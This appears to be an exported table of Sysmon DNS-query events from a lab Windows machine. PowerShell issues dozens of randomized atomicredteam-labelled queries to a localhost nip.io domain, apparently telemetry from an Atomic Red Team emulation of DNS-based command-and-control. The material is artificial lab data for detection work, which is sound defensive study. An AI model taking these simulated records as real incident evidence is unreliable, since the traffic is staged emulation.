"2025-12-22 13:58:07.772 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165483,"Query: atomicredteam-710368.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.801","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165484,"Query: atomicredteam-314149.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.845","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165485,"Query: atomicredteam-843249.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.890","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165486,"Query: atomicredteam-713353.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.934","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165487,"Query: atomicredteam-228997.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:06.975","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165488,"Query: atomicredteam-87873.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.017","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165489,"Query: atomicredteam-368837.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.058","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165490,"Query: atomicredteam-102953.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.237","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165491,"Query: atomicredteam-456220.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.281","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165492,"Query: atomicredteam-469809.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.324","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165493,"Query: atomicredteam-451007.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.369","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:07.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165494,"Query: atomicredteam-868760.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.552","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165495,"Query: atomicredteam-45969.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:07.723","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165496,"Query: atomicredteam-845899.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.043","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165497,"Query: atomicredteam-70619.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.087","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.774 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165498,"Query: atomicredteam-8335.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.407","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.775 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165499,"Query: atomicredteam-228729.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.451","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.775 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165500,"Query: atomicredteam-992201.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.494","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.775 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165501,"Query: atomicredteam-385184.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.534","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.777 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165502,"Query: atomicredteam-480302.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.577","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.777 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165503,"Query: atomicredteam-748248.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.621","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.777 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165504,"Query: atomicredteam-627232.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.664","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:08.777 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165505,"Query: atomicredteam-723751.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.708","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165506,"Query: atomicredteam-876886.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.751","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165507,"Query: atomicredteam-641378.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165508,"Query: atomicredteam-544017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.838","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165509,"Query: atomicredteam-878431.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.882","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165510,"Query: atomicredteam-140714.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.926","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165511,"Query: atomicredteam-479961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:08.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.776 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165512,"Query: atomicredteam-966274.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.011","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165513,"Query: atomicredteam-990863.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165514,"Query: atomicredteam-315036.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.371","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165515,"Query: atomicredteam-752307.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.414","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165516,"Query: atomicredteam-552031.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.459","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165517,"Query: atomicredteam-379716.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165518,"Query: atomicredteam-546000.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.547","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:09.778 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165519,"Query: atomicredteam-398765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.592","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165520,"Query: atomicredteam-730027.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165521,"Query: atomicredteam-319514.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.678","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165522,"Query: atomicredteam-67974.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165523,"Query: atomicredteam-494092.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.764","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165524,"Query: atomicredteam-248288.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.808","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165525,"Query: atomicredteam-25753.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165526,"Query: atomicredteam-173121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:09.892","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165527,"Query: atomicredteam-454088.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.063","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165528,"Query: atomicredteam-550959.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.107","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.784 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165529,"Query: atomicredteam-81123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.152","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165530,"Query: atomicredteam-410116.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.195","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:10.785 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",165531,"Query: atomicredteam-206727.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:10.238","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
